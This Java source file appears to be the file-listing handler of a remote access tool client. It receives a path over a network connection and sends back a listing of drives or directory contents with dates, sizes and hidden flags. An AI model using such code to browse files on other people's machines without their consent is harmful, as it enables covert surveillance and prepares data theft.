package com.redpois0n.packets;

import java.io.File;
import java.util.Calendar;
import java.util.Date;

import com.redpois0n.Connection;


public class PacketLISTFILES extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {	
		String current = Connection.readLine();

		PacketBuilder packet = new PacketBuilder(Header.LIST_FOLDERS);

		if (current.length() == 0) {
			File[] roots = File.listRoots();
			packet.add(roots.length);
			for (int i = 0; i < roots.length; i++) {
				packet.add(roots[i].getAbsolutePath());
				packet.add(true);
				packet.add(false);
			}
		} else {
			File dir = new File(current);
			File[] childs = dir.listFiles();
			if (childs != null) {
				packet.add(childs.length);
				for (int i = 0; i < childs.length; i++) {
					File file = childs[i];
					if (file.isDirectory()) {
						packet.add(file.getAbsoluteFile());
						packet.add(true);
						packet.add(file.isHidden());
					} else {
						packet.add(file.getAbsoluteFile());
						packet.add(false);
						packet.add(getDate(file.lastModified()));
						packet.add(file.length() + "");										
						packet.add(file.isHidden());
					}
				}
			}
		}
		
		packet.add("END");
		
		Connection.addToSendQueue(packet);
	}
	
	public String getDate(long date) {
		Calendar cal = Calendar.getInstance();
		cal.setTime(new Date(date));
		return (cal.get(Calendar.MONTH) + 1) + "/" + cal.get(Calendar.DAY_OF_MONTH) + "/" + cal.get(Calendar.YEAR) + " " + (00 + cal.get(Calendar.HOUR_OF_DAY)) + ":" + cal.get(Calendar.MINUTE);
	}

}
